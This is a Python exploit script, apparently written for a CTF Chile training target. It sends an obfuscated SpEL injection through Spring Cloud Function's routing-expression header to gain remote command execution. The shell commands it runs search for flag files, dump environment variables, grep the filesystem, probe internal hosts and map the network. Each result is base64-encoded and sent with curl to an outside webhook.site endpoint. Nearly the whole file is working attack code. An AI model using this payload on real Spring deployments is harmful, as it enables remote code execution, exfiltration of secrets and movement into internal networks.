#!/usr/bin/env python3
"""
CTF Chile - Búsqueda directa del flag con nuevo webhook
"""
import requests

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"
WH = "https://webhook.site/10bf3752-0207-4d16-b728-403485c53814"

def rce_search(cmd, tag):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'

    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[OK] {tag}: HTTP {r.status_code}")
        return r.status_code == 500  # 500 means RCE worked
    except Exception as e:
        print(f"[ERR] {tag}: {e}")
        return False

print("🎯 BÚSQUEDA DIRECTA DE FLAG - NUEVO WEBHOOK")
print("="*60)

# 1. Buscar flag directamente en archivos comunes
print("[1] Buscar flags en ubicaciones obvias...")
rce_search("find / -name '*flag*' -type f 2>/dev/null | head -5 | xargs cat 2>/dev/null", "flag_files")
rce_search("cat /flag.txt 2>/dev/null || cat /root/flag.txt 2>/dev/null || cat /app/flag.txt 2>/dev/null", "common_flags")

# 2. Buscar en JAR de la aplicación
print("[2] Buscar en aplicación...")
rce_search("strings /app/app.jar | grep 'ctfchile{' | head -3", "jar_flags")

# 3. Buscar en servicios internos (sabemos que están en 10.160.209.1:8000)
print("[3] Buscar en servicios internos...")
rce_search("curl -s http://10.160.209.1:8000/docs | grep -o 'ctfchile{[^}]*}'", "internal_docs")
rce_search("curl -s http://10.109.220.1:8000/docs | grep -o 'ctfchile{[^}]*}'", "internal_docs2")

# 4. Buscar en variables de entorno
print("[4] Buscar en entorno...")
rce_search("env | grep -i 'ctfchile\\|flag' | head -3", "env_flags")

# 5. Buscar con grep recursivo
print("[5] Búsqueda recursiva...")
rce_search("grep -r 'ctfchile{' /app /tmp /etc 2>/dev/null | head -3", "recursive_search")

# 6. Verificar red interna
print("[6] Mapear red...")
rce_search("hostname && whoami && ip addr | grep inet", "network_info")

print(f"\n🔗 Webhook: https://webhook.site/#!/10bf3752-0207-4d16-b728-403485c53814")
print("⏰ Espera 10 segundos y revisa el webhook para los resultados")
print("="*60)